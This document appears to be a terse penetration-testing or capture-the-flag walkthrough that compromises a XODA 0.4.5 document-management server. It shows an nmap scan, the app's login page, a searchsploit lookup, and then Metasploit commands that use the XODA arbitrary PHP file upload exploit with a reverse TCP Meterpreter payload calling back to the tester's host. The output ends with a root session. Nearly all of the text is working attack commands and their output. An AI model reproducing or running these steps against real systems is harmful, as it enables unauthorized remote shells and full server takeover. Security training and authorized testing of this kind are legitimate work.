
-- Exploit XODA via Metasploit --


kali@DNA:~# nmap -sS -sV x.x.x.x
Starting Nmap 7.70 for (x.x.x.x)
Host is up (0.000015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.0
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 02:32:D0:5D:G6:02 (Unknown)


//Check what application running on port 80

kali@DNA:~# curl http://x.x.x.x
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
kali@DNA:~# 


//Check exploit available using searchsploit

kali@DNA:~# searchsploit xoda
XODA 0.4.5 - Arbitrary '.PHP' File Upload (Metasploit) 
XODA Document Management System 0.4.5 - Cross-Site Scripting / Arbitrary File Upload  

kali@DNA:~# msfconsole -q
msf5 > search xoda
msf5 > use exploit/unix/webapp/xoda_file_upload 
msf5 exploit(unix/webapp/xoda_file_upload) > show options 
msf5 exploit(unix/webapp/xoda_file_upload) > set rhosts [TARGET IP]
msf5 exploit(unix/webapp/xoda_file_upload) > set payload php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/xoda_file_upload) > set lhost [LOCAL IP]
msf5 exploit(unix/webapp/xoda_file_upload) > set targeturi /
msf5 exploit(unix/webapp/xoda_file_upload) > exploit

[*] Started reverse TCP handler on x.x.x.x:4444 
[*] Sending PHP payload (BdLJIg.php)
[*] Executing PHP payload (BdLJIg.php)
[*] Sending stage (38247 bytes) to x.x.x.x
[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:55992) at 2020-09-28 17:02:21 +0000
[!] Deleting BdLJIg.php


meterpreter > getuid
Server username: root (0)
